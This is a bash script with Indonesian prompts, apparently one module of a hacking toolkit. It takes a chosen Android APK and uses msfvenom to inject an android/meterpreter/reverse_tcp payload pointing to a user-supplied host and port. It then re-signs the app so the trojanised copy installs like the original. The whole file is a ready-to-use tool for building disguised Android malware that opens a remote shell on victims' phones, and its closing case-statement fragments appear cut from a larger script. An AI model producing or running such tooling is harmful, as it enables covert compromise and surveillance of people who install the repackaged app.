#!/bin/bash
#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
unset LD_PRELOAD
subs="pilih file? Masukkan jumlah pilihan atau 'x' untuk keluar"
esit="kamu yakin ? tekan ENTER to exit"
return="ENTER to return to penetration revolution"
dir=$HOME/project
echo -e "$red [*]$yellow Pastikan, Metasploit diinstal"
echo -e "$red [*]$yellow Harap pertama-tama pindahkan atau salin file apk target Anda ke folder inject"
if [ ! -d $dir/modules/inject ]
        then
                mkdir $dir/modules/inject
                fi
echo -e "$cyan [*] Waiting..... !!!"
cd $HOME/project/modules/inject
ls | cat -n
read -p "$subs >> " choice;
if [[ $choice == "" ]]
        then
                echo -e "$red please enter valid choice\nSo please wait you are redirecting to Main Menu"
                sleep 3
                tool.sh
                fi
if [ $choice = 'x' ] ;
 then
echo -e "$red $esit"
read jaiho
exit
else
OUTPUT=`ls | sed -n $choice'p'`
mv $dir/modules/inject/$OUTPUT $HOME/metasploit-framework
echo -e "$lightgreen "
read -p "masukan host : " lhost;
read -p "masukan port : " lport;
read -p "[*] MASUKKAN NAMA output YANG ANDA INGINKAN UNTUK : "  output12;
echo
echo -e "$red [*] Please wait ...."
echo
cd $HOME/metasploit-framework
./msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
echo -e "$green signing apk ......."
mv $dir/unsign/output.apk $dir/unsign/$output12.apk
sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$output12.apk $dir/embout/$output12.apk
#apksigner -p cakil  keystore $dir/unsign/$output12.apk $dir/embout/$output12.apk
rm $dir/unsign/$output12.apk
fi
echo -e "$cyan sampai jumpa nanti "
echo -e "$blue press ENTER for main menu$reset"
read continued
cd $dir
./tool.sh
;;
exit
;;
esac
